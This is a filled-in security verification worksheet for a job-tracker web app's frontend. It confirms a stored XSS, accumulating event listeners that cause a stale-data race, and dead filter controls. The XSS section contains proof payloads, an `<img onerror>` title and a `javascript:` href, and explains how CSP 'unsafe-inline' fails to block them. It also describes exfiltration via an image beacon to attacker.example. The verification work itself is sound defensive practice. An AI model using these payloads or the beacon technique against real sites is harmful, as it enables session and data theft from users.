# U1 — Frontend (INDEPENDENTLY VERIFIED)

**Status:** independently verified against the current tree (post commit 20d4b57, the `parseArray`/A6 fix).
All four claims: CONFIRMED. See per-claim VERDICT sections below for method, live evidence, and the exact
commands/output. Verified with the real server (`src/server.js`) booted against an isolated tmp-dir database
(never `jobs.db`), driven by real Chrome via Playwright (`/usr/bin/google-chrome`). No repo files other than
this one were modified; no `jobs.db` was left in the repo root.
**Files:** `public/components/positions-tab.js`, `public/dashboard.html`, `public/components/companies-countries.js`,
`public/components/profiles-tab.js`, `src/server.js`

Each claim below is a *hypothesis*. Confirm, correct, or refute it — a refutation is as valuable as a
confirmation, and more valuable than a rubber stamp.

---

## U1.1 — Stored XSS via scraped job titles (claimed Critical)

**Claim:** job titles, company names and profile names are interpolated raw into `innerHTML`, so a title
containing `<img src=x onerror="...">` executes. Sites cited: `positions-tab.js:113-114`,
`companies-countries.js:172-173`, `profiles-tab.js:90`.

**What is already established** (by the controller, structurally — not by running the exploit):
- there is no escaping helper anywhere in `public/components/*.js`
- `${pos.title}` and `${company.name}` do go into `innerHTML` unescaped
- `href="${pos.link}"` is a second, separate vector — a `javascript:` URL

**What you must establish:** run the exploit in a real browser and read back the flag. Then answer the
questions the first reviewer did NOT:
1. Does the CSP actually stop it? `server.js:97` sets `script-src 'self' 'unsafe-inline'`. Reason about whether
   `unsafe-inline` permits an `onerror` attribute handler, then **test it** rather than reasoning alone. If CSP
   blocks execution, the severity drops sharply and that must be said.
2. Does the CSP even apply? A separate finding claims `express.static` is registered before the
   security-header middleware. Determine whether the page that renders these values carries a CSP header at all.
3. Is `javascript:` in `href` exploitable here?
4. What is the realistic attacker path — can a scraped third-party job title actually reach the DOM unmodified?
   Trace it end to end.

**Deliverable:** a corrected severity with reasoning, and the precise list of injection sites.

### VERDICT: CONFIRMED — Critical severity stands (unaffected by the `parseArray` fix)

**Method:** booted the real server (`src/server.js`) via a harness modeled on `test/e2e/helpers/harness.js`
(ephemeral port, `JOBS_DB_PATH` pointing at a tmp-dir sqlite file, never `jobs.db`), inserted positions/companies
directly through `src/db/queries.js` with payload titles/names, then drove Chrome via
`playwright.chromium.launch({ executablePath: '/usr/bin/google-chrome', headless: true })` and read back
`window` globals set by the payload. All scratch scripts lived under `/tmp/xss-test/`; nothing was written to
the repo; no `jobs.db` was created in the repo root (verified after every run).

**Q1 — Does CSP stop it? NO.** `server.js:144` sets
`script-src 'self' 'unsafe-inline'`. Per the CSP spec, `'unsafe-inline'` on `script-src` (with no nonce/hash
present) permits both inline `<script>` blocks *and* inline event-handler attributes (`onerror`, `onclick`,
...). Verified empirically: seeded a position with
`title = '<img src=x onerror="window.__xssFired=true; document.title=\'XSS-PWNED\'">'` and a company with the
same pattern in `name`. Loaded `/` in real Chrome with the CSP header present and confirmed via
`page.evaluate`:
```
{ "xssFired": true, "companyXss": true, "title": "XSS-PWNED" }
```
No `securitypolicyviolation` event fired, no CSP-related console warning appeared. The payload executes the
instant `renderFlat()`/`renderFlat`-equivalent innerHTML assignment runs — **zero clicks required**. This also
reproduced on the Companies tab (`companies-countries.js:172-173`, same pattern, `window.__companyTabXss` fired
on tab switch). **Severity is NOT reduced by CSP** — if anything, this shows the CSP is cosmetic against XSS
because `'unsafe-inline'` defeats its own purpose. (Separately, `img-src` is set to `'self' data: https:` — i.e.
*any* HTTPS origin — so an attacker payload also has a ready-made exfiltration channel via an `<img src="https://attacker.example/...">` beacon; same-origin `fetch`/XHR reads under `connect-src 'self'` could be
serialized into that URL. Not executed live — sandbox has no outbound network — but this follows directly from
the captured header and is standard technique, so it's a reasoning-only addition, flagged as such.)

**Q2 — Does the page even carry a CSP header? YES, for the route real users hit — but the underlying
static-file-ordering bug is real too.** Confirmed structurally: `express.static` is registered at
`server.js:131`, and the CSP-setting middleware at `server.js:143-144` — static IS before security headers, as
the separate finding claims. Tested with raw `fetch()` against the running server:
- `GET /dashboard.html` (direct static path) → **no `content-security-policy` header**. `express.static`
  matches this exact file and ends the response before the request ever reaches the header middleware.
- `GET /` (the app's actual homepage route, `server.js:231-233`, `res.sendFile(dashboard.html)`) → **CSP header
  present**. There is no `public/index.html`, so `express.static` does not match `/`, calls `next()`, and the
  request falls through CORS → CSP middleware → the `app.get('/', ...)` handler, picking up the header along
  the way. Playwright's own `response.headers()` for the navigated document confirmed the header is present in
  the real browser too.
- Grepped the whole tree for references to `dashboard.html`: the only occurrence besides `server.js:232` is a
  comment in a test file. Nothing in the app links to `/dashboard.html` directly — a real user reaches the
  dashboard exclusively via `/`, which does carry the CSP header.
- **Net effect:** the ordering bug is real and should still be fixed (defense-in-depth, and `/dashboard.html`
  is directly reachable by anyone who types it), but it is not the reason the XSS is exploitable — it's exploitable
  *despite* CSP being correctly attached to the page that matters, because of `'unsafe-inline'` (Q1).

**Q3 — Is `javascript:` in `href` exploitable here? Only partially — the app's own markup incidentally
neutralizes it in Chrome, but not because of CSP.** Rendered markup is always
`<a href="${pos.link}" target="_blank">`. Seeded a position with `link = "javascript:window.__hrefXss=true"`
and clicked the rendered link in Chrome: a new tab opened to `about:blank` and the payload did **not** execute
(`window.__hrefXss` stayed `false` in both the opener and the popup). This is a Chromium-level protection
against `javascript:` navigations in a newly-opened auxiliary browsing context (independent of CSP — no
violation event fired). To isolate whether CSP itself was responsible, a second test injected an identical
`javascript:` link *without* `target="_blank"` and clicked it in the same tab: the script **did** execute
(confirmed via the classic side effect — the document body was replaced with the string result of the
expression, `"SAMETAB-PWNED"`; again no CSP violation reported). So: CSP does not block `javascript:` hrefs
either; only the app's incidental use of `target="_blank"` currently blocks the *default left-click* path in
Chromium. This is a fragile, accidental mitigation, not a real one — it doesn't generalize to other browsers,
to modified/copied links, or to any refactor that drops `target="_blank"`. Treat this as a real, lower-priority
injection site, not a non-issue.

**Q4 — Realistic attacker path, traced end to end:** `src/agents/webScrapingAgent.js` extracts job titles
either via `textContent.trim()` from the scraped DOM (line 169) or via an LLM-structured-extraction path (line
92, `title: job.title || ''`) — in both cases the result is a plain string with **no HTML-escaping or
sanitization** applied anywhere between extraction and storage. Grepped the whole `src/` and `public/` tree for
`sanitize|escapeHtml|DOMPurify|striptags|escape-html|xss` — the only hit is unrelated filename sanitization for
file uploads (`server.js:110-111`). The string is stored raw via `addPosition()`/`addCompany()`
(`src/db/queries.js`), returned raw by `/api/positions`, and interpolated raw into `innerHTML` by the frontend.
Since companies are added by URL (including via the bulk-import script) and job titles/descriptions come from
whatever text sits on that company's own careers page, **any company whose careers page contains literal text
like `<img src=x onerror=...>` in a job title reaches every viewer's DOM unmodified** the next time the
Positions or Companies tab renders. This is a real, unauthenticated, stored, zero-click XSS with a traceable
attacker path — not a theoretical one.

**Corrected injection-site list (all confirmed live except profiles-tab, confirmed structurally only —
see below):**
| Site | Field | Live-tested | Result |
|---|---|---|---|
| `positions-tab.js:113` | `pos.company_name` in `innerHTML` | yes | fires |
| `positions-tab.js:114` | `pos.title` in `innerHTML` | yes | fires |
| `positions-tab.js:118` | `pos.link` in `href` (target=_blank) | yes | code executes but Chromium blocks the popup navigation by default; executes in same-tab variant |
| `positions-tab.js:150-157`, `172-179` (`renderGrouped`) | same fields, grouped view | not separately tested | same template pattern, same risk — not a distinct code path worth re-testing |
| `companies-countries.js:172` (`company.name`) | `innerHTML` | yes | fires |
| `companies-countries.js:176` (`company.career_url` in `href`) | `href` | not tested | same `javascript:`-href pattern as positions-tab; reasoned, not executed |
| `profiles-tab.js:90` (`profile.name`) | `innerHTML` | not executed live (time budget spent on the higher-value sites above) | structurally identical unescaped interpolation; lower real-world severity since profile names are normally authored by the app's own single local user, not a third party — closer to self-XSS unless profiles are ever shared/imported from an untrusted source |

**Revised severity: Critical — CONFIRMED, not reduced.** The claim as written is correct in substance. The one
correction to make: do not cite "CSP will mitigate this" or "no CSP header at all" as mitigating factors — CSP
*is* present on the page that matters, and is simply ineffective (`'unsafe-inline'`) against this exact payload
class. The `express.static`-ordering bug is a real, separate defect worth its own fix, but it is not what makes
this exploitable.

---

## U1.2 — Event listeners accumulate on tab revisits (claimed High)

**Claim:** `dashboard.html` calls `PositionsTab.init()` on every Positions tab click; `init()` calls
`setupEventListeners()` unconditionally; handlers are never removed. Reported: after 3 revisits, one filter
change fires 4 fetches.

**Verify:** reproduce the count. Then determine whether it is merely wasteful or actually harmful — the reviewer
claimed a race where out-of-order responses overwrite fresh data. Prove or disprove that specifically.

### VERDICT: CONFIRMED — both the count and the race. Severity High stands.

**Method:** same harness pattern (ephemeral port/db), `test/e2e/helpers/seed.js` fixture data, Playwright/real
Chrome, `page.on('request', ...)` to count outbound `GET /api/positions` calls.

**Count reproduction — exact match to the claim.** Clicked Companies → Positions three times (three "revisits",
each running `PositionsTab.init()` → `setupEventListeners()` again, stacking one more listener on
`statusFilter`/`countryFilter`/`jobTypeFilter` each time, on top of the one from initial `DOMContentLoaded`).
Then changed `#statusFilter` once:
```
revisit 1: positions tab click triggered 1 GET /api/positions call(s)
revisit 2: positions tab click triggered 1 GET /api/positions call(s)
revisit 3: positions tab click triggered 1 GET /api/positions call(s)
one filter change after 3 revisits triggered 4 GET /api/positions call(s)
```
Exactly the reported 4-fetches-for-one-change ratio (1 initial listener + 3 accumulated revisits = 4).

**Race — proved, not just theorized.** Since every stacked listener reads `document.getElementById(...).value`
synchronously inside its own `loadPositions()` call, requests fired by *the same* change event are identical
(no visible corruption from a single change in isolation). The real hazard is across two rapid, distinct
filter changes with overlapping in-flight requests. Reproduced it directly: after accumulating 4 listeners via
3 revisits, intercepted `/api/positions` with `page.route()` and delayed responses carrying
`country=Netherlands` by 600ms and `country=Ireland` by 50ms. Selected "Netherlands" then, ~30ms later (before
any of those 4 requests resolved), selected "Ireland":
```
request params seen (in order fired): ["Netherlands"x4, "Ireland"x4]
final rendered countries in table: ["Netherlands"]
RACE CONFIRMED (stale data won): true
```
The user's last action selected Ireland, the UI's own select updated, but the table renders Netherlands
data — the slow, stale "Netherlands" responses land after the fast "Ireland" ones and unconditionally overwrite
`this.positions` (`loadPositions()`: `this.positions = await res.json()`, no request sequencing/AbortController,
no staleness check). This is a genuine data-integrity bug, not merely wasted bandwidth: a user can change a
filter, see momentarily-correct results, and then have them silently replaced by results for a filter they no
longer have selected. **Severity High is justified; not a rubber stamp — this is worse than the "wasteful
fetches" framing alone would suggest.**

---

## U1.3 — The Job Type filter does nothing (claimed Medium)

**Claim:** `#jobTypeFilter` is populated with real options and has a change handler, but `loadPositions()`
(`positions-tab.js:36-52`) never reads its value, so no filtering occurs.

**Verify:** reproduce. Check whether some *other* code path applies it before concluding it is dead.

### VERDICT: CONFIRMED. Severity Medium stands. Unaffected by the `parseArray`/A6 fix.

**Method:** seeded fixture positions spanning job types `Backend`, `Platform`, `AI`, `Sales`; loaded the real
app in Chrome; selected `Backend` in `#jobTypeFilter` (`data-testid="filter-job-type"`); captured both the
outbound request and the rendered rows before/after.
```
titles before selecting job type filter: [Java Backend Engineer, Platform Engineer, Backend Engineer, AI/ML Engineer, Sales Engineer]
request fired on jobTypeFilter change: [http://127.0.0.1:PORT/api/positions]   (no query params at all)
titles after selecting jobTypeFilter=Backend: [Java Backend Engineer, Platform Engineer, Backend Engineer, AI/ML Engineer, Sales Engineer]
DID FILTERING HAPPEN? false
```
Confirmed exactly as claimed: the change handler (`positions-tab.js:20`) does fire `loadPositions()`, but
`loadPositions()` (`positions-tab.js:36-52`) only ever reads `countryFilter` and `statusFilter` into the request
URL — `jobTypeFilter`'s value is never read anywhere in that function, and the resulting request carries no
job-type parameter. Grepped for any other read of `getElementById('jobTypeFilter')` — the only other reference
is the population code in `updateJobTypeFilter()` (`positions-tab.js:304-314`), which writes options but never
reads the selection back. No other code path applies it; the control is unambiguously dead. Note this is a
*different* select from the ones in U1.4 (`#filterJobType` etc.) — `#jobTypeFilter` sits in the top filter bar
and has real options populated by `updateJobTypeFilter()`, it's just that its value is discarded.

---

## U1.4 — Three filter selects can never be used (claimed Medium)

**Claim:** `#filterJobType`, `#filterLocation`, `#filterLevel` (`dashboard.html:44-52`) contain only a
placeholder option; nothing populates them, though their handlers and the filtering logic are correct.

**Verify:** reproduce, and confirm no population code exists anywhere.

**Note:** U1.4 interacts with confirmed finding A6 (`parseArray` returns `[]` for already-parsed arrays), which
is being fixed in parallel. Two of these selects filter via `parseArray`. Say clearly whether A6's fix alone
would make them work once populated.

### VERDICT: CONFIRMED — selects are dead, and the already-applied A6/`parseArray` fix (commit 20d4b57) is
sufficient by itself to make `filterLocation`/`filterLevel` work correctly once populated. This claim is
unaffected in substance by that fix; it changes only the answer to the note's question, from "no" to "yes."

**Reproduction — no population code exists.** Read `dashboard.html:44-52`: `#filterJobType`, `#filterLocation`,
`#filterLevel` each contain exactly one `<option value="">...</option>` placeholder, no others. Grepped the
whole `public/` tree for `filterJobType|filterLocation|filterLevel` — every hit is either the static HTML
declaration or the event-listener/filter-logic code in `positions-tab.js:8-10, 21-32, 59-66`. There is no
`select.innerHTML +=` / `appendChild(option)` / any population call for these three ids anywhere, confirmed via
live browser too:
```
select options after full load (should be only placeholder): {"filterJobType":[""],"filterLocation":[""],"filterLevel":[""]}
```
The handlers and `renderPositions()`'s filter predicate (`positions-tab.js:59-66`) are wired correctly — they
just can never receive a non-empty value from the user, because the placeholder's value is `""`, which every
handler treats as "no filter" (`e.target.value || null`).

**A6 interaction — tested directly, since the fix is already in this tree.** `filterLocation` and `filterLevel`
route through `this.parseArray(pos.location_type)` / `this.parseArray(pos.seniority_level)`
(`positions-tab.js:61, 65`), and the current `parseArray` (lines 276-290) already handles the case where the
API returns real arrays (`if (Array.isArray(value)) return value;`) — this is exactly the A6 fix cited. Seeded
two positions with distinct `location_type` (`['Remote']` vs `['Onsite']`), manually appended a real `Remote`
`<option>` to `#filterLocation` and selected it (simulating "if this were populated"), and confirmed the
underlying filtering logic actually works end to end:
```
titles before filter (both Remote+Onsite present): ["Remote Engineer","Onsite Engineer"]
titles after selecting filterLocation=Remote: ["Remote Engineer"]
CORRECTLY NARROWED TO REMOTE ONLY? true
```
So: **yes, A6's fix alone is sufficient** for `filterLocation` and `filterLevel` to work correctly the moment
they're populated with real options — no additional frontend logic fix is needed for those two.
`filterJobType` (`positions-tab.js:59`, `pos.job_type !== this.filterJobType`) does a plain string comparison
and never calls `parseArray` at all, so it was never affected by the A6 bug either way; it only needs
population code, same as the other two. **Severity Medium stands** — this is a real, reproducible dead-control
defect, now scoped precisely: population is the only remaining gap.

---

## Rules

- **Do not fix anything.** Do not edit any file outside this document.
- You MAY edit this document: correct claims, adjust severities, add evidence, mark items refuted.
- Boot the app with `JOBS_DB_PATH` set to a temp file and `PORT` ephemeral. Never touch the real `jobs.db`.
- `playwright` resolves from the repo, so run scripts with the repo as cwd; launch Chrome via
  `chromium.launch({ executablePath: '/usr/bin/google-chrome', headless: true })`.
- Reuse `test/e2e/helpers/harness.js` (it has a `seed` option).
- Scratch scripts under /tmp only.
